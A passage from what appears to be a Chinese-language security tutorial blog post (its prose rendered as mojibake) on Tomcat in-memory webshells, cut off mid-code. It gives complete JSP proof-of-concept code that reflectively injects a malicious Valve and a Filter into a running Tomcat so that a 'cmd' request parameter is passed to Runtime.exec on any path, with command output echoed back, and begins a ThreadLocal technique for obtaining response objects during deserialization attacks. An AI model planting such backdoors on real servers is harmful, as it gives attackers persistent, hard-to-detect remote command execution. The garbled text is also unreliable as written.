class="string">&quot;/shell&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>å…ˆæ³¨å†ŒServlet</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/Java_Shell_war_exploded/Servlet.jsp</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010647020.png"                      alt="image-20230201064710941"                ><figcaption>image-20230201064710941</figcaption></figure></p><blockquote><p>Servletå‹å†…å­˜é©¬çš„ç¼ºç‚¹å°±æ˜¯å¿…é¡»è¦è®¿é—®å¯¹åº”çš„è·¯å¾„æ‰èƒ½å‘½ä»¤æ‰§è¡Œï¼Œæ˜“è¢«å‘ç°ã€‚</p></blockquote><h3 id="Valveå‹"><a href="#Valveå‹" class="headerlink" title="Valveå‹"></a>Valveå‹</h3><p>éœ€è¦å…ˆäº†è§£ä¸€ä¸‹tomcatä¸­çš„ç®¡é“æœºåˆ¶</p><p>Tomcat åœ¨å¤„ç†ä¸€ä¸ªè¯·æ±‚è°ƒç”¨é€»è¾‘æ—¶éœ€è¦ä¼ é€’Request å’Œ Respone å¯¹è±¡ï¼ŒTomcat ä½¿ç”¨äº†èŒè´£é“¾æ¨¡å¼æ¥å®ç°å®¢æˆ·ç«¯è¯·æ±‚çš„å¤„ç†ã€‚åœ¨ Tomcat ä¸­å®šä¹‰äº†ä¸¤ä¸ªæ¥å£ï¼šPipelineï¼ˆç®¡é“ï¼‰å’Œ Valveï¼ˆé˜€ï¼‰ã€‚è¿™ä¸¤ä¸ªæ¥å£åå­—å¾ˆå¥½çš„è¯ é‡Šäº†å¤„ç†æ¨¡å¼ï¼šæ•°æ®æµå°±åƒæ˜¯æµç»ç®¡é“çš„æ°´ä¸€æ ·ï¼Œç»è¿‡ç®¡é“ä¸Šä¸ªä¸€ä¸ªä¸ªé˜€é—¨ã€‚</p><p>Pipeline ä¸­ä¼šæœ‰ä¸€ä¸ªæœ€åŸºç¡€çš„ Valveï¼ˆbasicï¼‰ï¼Œå®ƒå§‹ç»ˆä½äºæœ«ç«¯ï¼ˆæœ€åæ‰§è¡Œï¼‰ï¼Œå°è£…äº†å…·ä½“çš„è¯·æ±‚å¤„ç†å’Œè¾“å‡ºå“åº”çš„è¿‡ç¨‹ã€‚Pipeline æä¾›äº† <code>addValve</code> æ–¹æ³•ï¼Œå¯ä»¥æ·»åŠ æ–° Valve åœ¨ basic ä¹‹å‰ï¼Œå¹¶æŒ‰ç…§æ·»åŠ é¡ºåºæ‰§è¡Œã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010646623.png"                      alt="image-20230201064647521"                ><figcaption>image-20230201064647521</figcaption></figure></p><blockquote><p>åœ¨Tomcatä¸­ï¼Œå››å¤§ç»„ä»¶Engineã€Hostã€Contextä»¥åŠWrapperéƒ½æœ‰å…¶å¯¹åº”çš„Valveç±»ï¼ŒStandardEngineValveã€StandardHostValveã€StandardContextValveä»¥åŠStandardWrapperValveï¼Œä»–ä»¬åŒæ—¶ç»´æŠ¤ä¸€ä¸ªStandardPipelineå®ä¾‹ã€‚</p></blockquote><h4 id="åŠ¨æ€æ·»åŠ Valve"><a href="#åŠ¨æ€æ·»åŠ Valve" class="headerlink" title="åŠ¨æ€æ·»åŠ Valve"></a>åŠ¨æ€æ·»åŠ Valve</h4><p>å…ˆæ¥ç®€å•çœ‹ä¸€ä¸‹æ¥å£çš„å®šä¹‰ï¼Œ<code>org.apache.catalina.Pipeline</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Pipeline</span> <span class="keyword">extends</span> <span class="title class_">Contained</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getBasic</span><span class="params">()</span>;<span class="comment">//è·å–åŸºç¡€é˜€é—¨</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBasic</span><span class="params">(Valve valve)</span>;<span class="comment">//è®¾ç½®åŸºç¡€é˜€é—¨</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span>;<span class="comment">//å¢åŠ é˜€é—¨*</span></span><br><span class="line">    <span class="keyword">public</span> Valve[] getValves();<span class="comment">//è·å–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeValve</span><span class="params">(Valve valve)</span>;<span class="comment">//ç§»é™¤</span></span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getFirst</span><span class="params">()</span>;<span class="comment">//è·å–é¦–ä¸ª</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;<span class="comment">//æ˜¯å¦æ”¯æŒå¼‚æ­¥*</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findNonAsyncValves</span><span class="params">(Set&lt;String&gt; result)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>org.apache.catalina.Valve</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getNext</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span>;<span class="comment">//è®¾ç½®ä¸‹ä¸€ä¸ªé˜€é—¨</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span><span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Tomcat ä¸­ Pipeline ä»…æœ‰ä¸€ä¸ªå®ç° StandardPipelineï¼Œå­˜æ”¾åœ¨ ContainerBase çš„ pipeline å±æ€§ä¸­ï¼Œå¹¶ä¸” ContainerBase æä¾› <code>addValve</code> æ–¹æ³•è°ƒç”¨ StandardPipeline çš„ addValve æ–¹æ³•æ·»åŠ ã€‚</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Contained) &#123;</span><br><span class="line">        ((Contained) valve).setContainer(<span class="built_in">this</span>.container);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (getState().isAvailable()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((Lifecycle) valve).start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardPipeline.valve.start&quot;</span>), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">null</span>) &#123;</span><br><span class="line">        first = valve;</span><br><span class="line">        valve.setNext(basic);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Valve</span> <span class="variable">current</span> <span class="operator">=</span> first;</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (current.getNext() == basic) &#123;</span><br><span class="line">                current.setNext(valve);</span><br><span class="line">                valve.setNext(basic);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            current = current.getNext();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>Tomcat ä¸­å››ä¸ªå±‚çº§çš„å®¹å™¨éƒ½ç»§æ‰¿äº† ContainerBase ï¼Œæ‰€ä»¥åœ¨å“ªä¸ªå±‚çº§çš„å®¹å™¨çš„æ ‡å‡†å®ç°ä¸Šæ·»åŠ è‡ªå®šä¹‰çš„ Valve å‡å¯ã€‚</p></blockquote><p>æ·»åŠ åï¼Œå°†ä¼šåœ¨ <code>org.apache.catalina.connector.CoyoteAdapter</code> çš„ <code>service</code> æ–¹æ³•ä¸­è°ƒç”¨ Valve çš„ <code>invoke</code> æ–¹æ³•ã€‚</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(org.apache.coyote.Request req, org.apache.coyote.Response res)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        postParseSuccess = postParseRequest(req, request, res, response);</span><br><span class="line">        <span class="keyword">if</span> (postParseSuccess) &#123;</span><br><span class="line">            request.setAsyncSupported(</span><br><span class="line">                    connector.getService().getContainer().getPipeline().isAsyncSupported());</span><br><span class="line">            connector.getService().getContainer().getPipeline().getFirst().invoke(</span><br><span class="line">                    request, response);<span class="comment">//è°ƒç”¨invoke</span></span><br></pre></td></tr></table></figure></div><p>è¿™æ ·æ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬åªè¦å†™ä¸€ä¸ªæ¶æ„Valveä¸ºäº†æ–¹ä¾¿å¯ä»¥ç»§æ‰¿<code>ValveBase</code>ï¼Œç„¶åå°†æ¶æ„ä»£ç å†™åœ¨invokeæ–¹æ³•ä¸­,ä¹‹ååªè¦å…ˆé€šè¿‡<code>StandardContext</code>å¯¹è±¡è·å–<code>StandardPipeline</code>ï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨<code>StandardPipeline.addValve()</code>åŠ¨æ€æ·»åŠ Valve</p><h4 id="å®Œæ•´POC-2"><a href="#å®Œæ•´POC-2" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Pipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> standardContext.getPipeline();</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Shell_Valve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Valve</span> <span class="variable">shell_valve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Valve</span>();</span><br><span class="line">    pipeline.addValve(shell_valve);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>åŠ è½½Valve</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/Java_Shell_war_exploded/Valve.jsp</span><br></pre></td></tr></table></figure></div><p>ä¹‹åå¯ä»¥ä»»æ„è·¯å¾„å‘½ä»¤æ‰§è¡Œ</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010705853.png"                      alt="image-20230201070553758"                ><figcaption>image-20230201070553758</figcaption></figure></p><h2 id="0x02-å†…å­˜é©¬å›æ˜¾æŠ€æœ¯"><a href="#0x02-å†…å­˜é©¬å›æ˜¾æŠ€æœ¯" class="headerlink" title="0x02 å†…å­˜é©¬å›æ˜¾æŠ€æœ¯"></a>0x02 å†…å­˜é©¬å›æ˜¾æŠ€æœ¯</h2><h3 id="å›æ˜¾ç¤ºä¾‹"><a href="#å›æ˜¾ç¤ºä¾‹" class="headerlink" title="å›æ˜¾ç¤ºä¾‹"></a>å›æ˜¾ç¤ºä¾‹</h3><p>å¯ä»¥åˆ©ç”¨ä¹‹å‰çš„Tomcat Filterå‹å†…å­˜é©¬è·å–å›æ˜¾,ä¿®æ”¹ä¸€ä¸‹æ¶æ„Filter</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//å°†å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥æ‰«æå™¨å¹¶è¯»å–æ‰€æœ‰è¾“å…¥</span></span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext()?scanner.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                scanner.close();</span><br><span class="line">                writer.write(result);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010710660.png"                      alt="image-20230201071005531"                ><figcaption>image-20230201071005531</figcaption></figure></p><h3 id="ThreadLocal-Responseå›æ˜¾"><a href="#ThreadLocal-Responseå›æ˜¾" class="headerlink" title="ThreadLocal Responseå›æ˜¾"></a>ThreadLocal Responseå›æ˜¾</h3><p>å®éªŒç¯å¢ƒ:Tomcat 9.0.77 (Tomcat10åéƒ¨åˆ†æºç é€»è¾‘ä¿®æ”¹,ä»¥åŠä¸€äº›åå°„ä½¿ç”¨ä¼šæŠ¥NullPointerException)</p><p>å¦‚æœç”¨Tomcatçš„å†…å­˜é©¬ï¼Œéœ€è¦JSPæ–‡ä»¶ï¼Œå½“æˆ‘ä»¬éœ€è¦ååºåˆ—åŒ–æ¼æ´æ¥æ³¨å…¥å†…å­˜é©¬æ˜¯ï¼Œéœ€è¦å…¶ä»–çš„æ–¹æ³•è·å–requestå’Œresponseå¯¹è±¡ã€‚</p><p>é¦–å…ˆè¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬å¯»æ‰¾çš„requestå¯¹è±¡åº”è¯¥æ˜¯ä¸€ä¸ªå’Œå½“å‰çº¿ç¨‹ThreadLocalæœ‰å…³çš„å¯¹è±¡ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ã€‚è¿™æ ·æ‰èƒ½è·å–åˆ°å½“å‰çº¿ç¨‹çš„ç›¸å…³ä¿¡æ¯ã€‚æœ€ç»ˆæˆ‘ä»¬èƒ½å¤Ÿåœ¨<code>org.apache.catalina.core.ApplicationFilterChain</code>ç±»ä¸­æ‰¾åˆ°è¿™æ ·ä¸¤ä¸ªå˜é‡*<code>lastServicedRequest</code><em>å’Œ</em><code>lastServicedResponse</code>*ã€‚</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ApplicationFilterChain</span> <span class="keyword">implements</span> <span class="title class_">FilterChain</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br></pre></td></tr></table></figure></div><blockquote><p>å¹¶ä¸”è¿™ä¸¤ä¸ªå±æ€§è¿˜æ˜¯é™æ€çš„,é»˜è®¤èµ‹å€¼</p></blockquote><p>åœ¨<code>ApplicationFilterChain#internalDoFilter</code>ä¸­ï¼ŒTomcatä¼šå°†requestå¯¹è±¡å’Œresponseå¯¹è±¡å­˜å‚¨åˆ°è¿™ä¸¤ä¸ªå˜é‡ä¸­</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,ServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">    lastServicedRequest.set(request);</span><br><span class="line">    lastServicedResponse.set(response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ¡ä»¶<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>,é»˜è®¤å€¼ä¸ºfalseï¼Œä½†å¯ä»¥åå°„ä¿®æ”¹</p></blockquote><p>æ€»ç»“ä¸€ä¸‹æ€è·¯</p><ol><li>åå°„ä¿®æ”¹<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>çš„å€¼ï¼Œé€šè¿‡<code>ThreadLocal#set</code>æ–¹æ³•å°†requestå’Œresponseå¯¹è±¡å­˜å‚¨åˆ°å˜é‡ä¸­</li><li>åˆå§‹åŒ–<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>ä¸¤ä¸ªå˜é‡ï¼Œé»˜è®¤ä¸ºnull</li><li>é€šè¿‡<code>ThreadLocal#get</code>æ–¹æ³•å°†requestå’Œresponseå¯¹è±¡ä»*<code>lastServicedRequest</code><em>å’Œ</em><code>lastServicedResponse</code>*ä¸­å–å‡º</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebServlet(&quot;/echo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tomcat_Echo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//åå°„è·å–æ‰€éœ€å±æ€§</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//ä½¿ç”¨modifiersFieldåå°„ä¿®æ”¹finalå‹å˜é‡</span></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">modifiersField</span> 